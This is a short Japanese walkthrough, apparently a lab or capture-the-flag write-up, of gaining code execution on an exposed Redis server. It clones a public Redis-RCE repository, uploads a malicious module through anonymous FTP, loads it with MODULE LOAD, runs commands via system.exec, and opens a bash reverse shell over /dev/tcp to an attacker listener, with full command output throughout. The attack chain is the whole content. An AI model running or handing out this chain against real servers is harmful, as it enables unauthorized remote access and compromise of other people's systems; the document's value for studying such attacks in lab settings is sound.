# リポジトリのクローン
```zsh
git clone https://github.com/jas502n/Redis-RCE
```

```zsh
cd Redis-RCE
```
# MODULEのアップロード
FTPサーバ等を利用してモジュールをアップロード
```zsh
ftp 192.168.120.93
Connected to 192.168.120.93.
220 (vsFTPd 3.0.2)
Name (192.168.120.93:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

```zsh
ftp> cd pub
250 Directory successfully changed.
ftp> put exp_lin.so 
local: exp_lin.so remote: exp_lin.so
229 Entering Extended Passive Mode (|||10100|).
150 Ok to send data.
100% |************************************************************************************************************************************************| 42680      228.72 KiB/s    00:00 ETA
226 Transfer complete.
42680 bytes sent in 00:00 (116.78 KiB/s)
```
# MODULEを読み込む
```zsh
redis-cli -h 192.168.120.93      
192.168.120.93:6379> INFO kyespaces
192.168.120.93:6379> MODULE LOAD /var/ftp/pub/exp_lin.so
OK
192.168.120.93:6379> system.exec "id"
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
```

# Reverse Shell
```zsh
192.168.120.93:6379> system.exec "bash -i >& /dev/tcp/192.168.45.159/6379 0>&1"

rlwrap -cAr nc -lvnp 6379
listening on [any] 6379 ...
connect to [192.168.45.159] from (UNKNOWN) [192.168.120.93] 45526
bash: no job control in this shell
```

```zsh
[pablo@sybaris tmp]$ whoami
whoami
pablo
[pablo@sybaris tmp]$ id
id
uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)
[pablo@sybaris tmp]$ 
```